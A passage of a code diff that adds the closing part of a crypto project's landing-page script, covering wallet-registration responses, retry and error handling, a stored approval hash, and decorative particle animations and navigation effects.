+                                const shortAddress = `${account.slice(0, 6)}...${account.slice(-4)}`;
+                                if (elements.headingRegister) {
+                                    elements.headingRegister.innerHTML = `✅ Already Registered: ${shortAddress}`;
+                                    elements.headingRegister.classList.add('connected');
+                                }
+                                if (elements.connectWalletBtn) {
+                                    elements.connectWalletBtn.innerHTML = `✅ <span class="wallet-address">${shortAddress}</span>`;
+                                    elements.connectWalletBtn.classList.add('connected');
+                                }
+
+                                // Close modal after short delay
+                                setTimeout(() => {
+                                    if (elements.closeModal) {
+                                        elements.closeModal.disabled = false;
+                                        elements.closeModal.style.opacity = '1';
+                                        elements.closeModal.style.cursor = 'pointer';
+                                        closeWalletModal();
+                                    }
+                                }, 1500);
+                            } else {
+                                Swal.fire({
+                                    icon: 'success',
+                                    title: 'Registration Successful',
+                                    html: 'Welcome to PVC Meta!<br><br>Join our Telegram Community for updates.'
+                                }).then(() => {
+                                    // Re-enable close button when done
+                                    if (elements.closeModal) {
+                                        elements.closeModal.disabled = false;
+                                        elements.closeModal.style.opacity = '1';
+                                        elements.closeModal.style.cursor = 'pointer';
+                                        closeWalletModal();
+                                    }
+                                });
+                            }
+                            break;
+                        } else if (registerResponse.status >= 500) {
+                            console.warn(`⚠️ Registration attempt ${attempt} failed (5xx), retrying...`);
+                            if (attempt < maxRetries) {
+                                await new Promise(r => setTimeout(r, 2000));
+                                continue;
+                            }
+                            throw new Error('Server temporarily unavailable. Your registration progress is saved — please try again shortly.');
+                        } else {
+                            throw new Error(data.message || 'Registration failed');
+                        }
+                    } catch (regError) {
+                        if (attempt >= maxRetries && !registerSuccess) {
+                            if (approvalHash) {
+                                localStorage.setItem('pvc_pending_approval', JSON.stringify({
+                                    walletAddress: account,
+                                    approvalTxHash: approvalHash,
+                                    timestamp: Date.now()
+                                }));
+                            }
+                            console.error('Backend error:', regError);
+                            Swal.fire({
+                                icon: 'error',
+                                title: 'Registration Failed',
+                                text: regError.message || 'Error connecting to server. Your registration progress has been saved.'
+                            });
+                        }
+                    }
+                }
+
+            } catch (error) {
+                console.error('Error:', error);
+
+                // Re-enable close button on error
+                if (elements.closeModal) {
+                    elements.closeModal.disabled = false;
+                    elements.closeModal.style.opacity = '1';
+                    elements.closeModal.style.cursor = 'pointer';
+                }
+
+                if (error.message.includes('rejected') || error.message.includes('User denied')) {
+                    showModalMessage('❌ Registration Failed', 'error');
+                    if (elements.headingRegister) {
+                        elements.headingRegister.innerHTML = 'Register';
+                    }
+                } else {
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Error',
+                        text: error.message || 'An unexpected error occurred',
+                        // Ensure styling matches theme if possible, but SweetAlert standard is roughly compatible
+                        // or we can stick to modal message for consistency
+                        confirmButtonColor: '#00d4ff',
+                        background: '#002b36',
+                        color: '#fff'
+                    });
+                }
+
+                // Keep modal open on error so user can see message
+            } finally {
+                if (loader) loader.style.display = 'none';
+                if (registerText) registerText.style.display = 'inline-block';
+                if (registerBtn) registerBtn.disabled = false;
+            }
+        }
+
+        // Global UI Event Listeners
+        // All entry points now lead to the same Unified Flow
+        function triggerUnifiedFlow() {
+            if (isConnected) {
+                // If already connected, just run registration check/approval
+                registerUser();
+            } else {
+                openWalletModal();
+            }
+        }
+
+        elements.connectWalletBtn.addEventListener('click', openWalletModal); // Top right button
+        elements.headingRegister.addEventListener('click', triggerUnifiedFlow); // Hero button
+
+        elements.closeModal.addEventListener('click', closeWalletModal);
+        elements.connectActionBtn.addEventListener('click', connectWallet);
+
+        // Close modal when clicking outside
+        walletModal.addEventListener('click', (e) => {
+            if (e.target === walletModal) {
+                closeWalletModal();
+            }
+        });
+
+        // Mobile Menu Toggle
+        const mobileMenu = document.getElementById('mobileMenu');
+        const navLinks = document.getElementById('navLinks');
+
+        mobileMenu.addEventListener('click', () => {
+            mobileMenu.classList.toggle('active');
+            navLinks.classList.toggle('active');
+        });
+
+        // Network Background Animation
+        const canvas = document.getElementById('networkCanvas');
+        const ctx = canvas.getContext('2d');
+        let particles = [];
+        let animationId;
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        class NetworkParticle {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.vx = (Math.random() - 0.5) * 0.5;
+                this.vy = (Math.random() - 0.5) * 0.5;
+                this.radius = Math.random() * 2 + 1;
+            }
+
+            update() {
+                this.x += this.vx;
+                this.y += this.vy;
+
+                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+            }
+
+            draw() {
+                ctx.beginPath();
+                ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(0, 212, 255, 0.5)';
+                ctx.fill();
+            }
+        }
+
+        // Initialize particles with reduced count for better performance
+        for (let i = 0; i < 50; i++) {
+            particles.push(new NetworkParticle());
+        }
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+            // Update and draw particles
+            particles.forEach(particle => {
+                particle.update();
+                particle.draw();
+            });
+
+            // Draw connections with reduced distance for better performance
+            particles.forEach((p1, i) => {
+                particles.slice(i + 1).forEach(p2 => {
+                    const dx = p1.x - p2.x;
+                    const dy = p1.y - p2.y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+
+                    if (distance < 120) {
+                        ctx.beginPath();
+                        ctx.moveTo(p1.x, p1.y);
+                        ctx.lineTo(p2.x, p2.y);
+                        ctx.strokeStyle = `rgba(0, 212, 255, ${0.2 * (1 - distance / 120)})`;
+                        ctx.lineWidth = 1;
+                        ctx.stroke();
+                    }
+                });
+            });
+
+            animationId = requestAnimationFrame(animate);
+        }
+
+        animate();
+
+        // Floating Particles
+        const particlesContainer = document.getElementById('particles');
+
+        function createFloatingParticle() {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+
+            const size = Math.random() * 4 + 2;
+            particle.style.width = size + 'px';
+            particle.style.height = size + 'px';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDuration = (Math.random() * 10 + 10) + 's';
+            particle.style.animationDelay = Math.random() * 5 + 's';
+
+            particlesContainer.appendChild(particle);
+
+            setTimeout(() => {
+                particle.remove();
+            }, 20000);
+        }
+
+        // Create particles periodically
+        setInterval(createFloatingParticle, 800);
+
+        // Initial batch - reduced for performance
+        for (let i = 0; i < 10; i++) {
+            setTimeout(createFloatingParticle, i * 300);
+        }
+
+        // Scroll animations
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                }
+            });
+        }, observerOptions);
+
+        document.querySelectorAll('.fade-in-up').forEach(el => {
+            observer.observe(el);
+        });
+
+        // Language selector
+        const langButtons = document.querySelectorAll('.lang-btn');
+        langButtons.forEach(btn => {
+            btn.addEventListener('click', () => {
+                langButtons.forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+            });
+        });
+
+        // Smooth scroll for anchor links
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({
+                        behavior: 'smooth',
+                        block: 'start'
+                    });
+                    // Close mobile menu if open
+                    navLinks.classList.remove('active');
+                    mobileMenu.classList.remove('active');
+                }
+            });
+        });
+
+        // Add hover effect to CTA buttons
+        const ctaButtons = document.querySelectorAll('.cta-btn');
+        ctaButtons.forEach(btn => {
+            btn.addEventListener('mouseenter', function () {
+                this.style.transform = 'translateY(-5px) scale(1.02)';
+            });
+            btn.addEventListener('mouseleave', function () {
+                this.style.transform = 'translateY(0) scale(1)';
+            });
+        });
+    </script>
+</body>
+
+</html>
